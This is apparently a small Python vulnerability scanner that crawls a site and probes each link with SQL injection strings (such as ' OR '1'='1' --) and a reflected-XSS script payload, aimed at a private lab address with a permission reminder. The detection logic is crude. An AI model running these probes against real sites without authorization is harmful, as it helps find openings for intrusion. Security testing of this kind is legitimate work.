import requests
from bs4 import BeautifulSoup

# Basic web crawler to find links
def crawl(base_url):
    found_urls = set([base_url])
    to_visit = set([base_url])

    while to_visit:
        url = to_visit.pop()
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full_link = link['href']
                if full_link.startswith('/'):
                    full_link = base_url + full_link
                if base_url in full_link and full_link not in found_urls:
                    found_urls.add(full_link)
                    to_visit.add(full_link)
        except requests.exceptions.RequestException:
            pass

    return found_urls

# Function to test for SQL Injection
def test_sql_injection(url):
    sql_payloads = ["'", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]
    vulnerable = False
    for payload in sql_payloads:
        try:
            response = requests.get(f"{url}{payload}")
            if response.status_code == 200 and ("mysql" in response.text.lower() or "syntax error" in response.text.lower()):
                vulnerable = True
                break
        except requests.exceptions.RequestException:
            pass
    if vulnerable:
        print(f"[!] SQL Injection vulnerability detected at: {url}")

# Function to test for XSS
def test_xss(url):
    xss_payload = "<script>alert('XSS')</script>"
    try:
        response = requests.get(f"{url}{xss_payload}")
        if xss_payload in response.text:
            print(f"[!] XSS vulnerability detected at: {url}")
    except requests.exceptions.RequestException:
        pass

# Main function to run the scanner
def run_scanner(base_url):
    print(f"Scanning {base_url} for vulnerabilities...")
    urls = crawl(base_url)
    print(f"Found {len(urls)} URLs to test.")
    for url in urls:
        test_sql_injection(url)
        test_xss(url)

if __name__ == "__main__":
    target_url = "http://192.168.179.138"  # Replace with the target URL, ensure you have permission
    run_scanner(target_url)

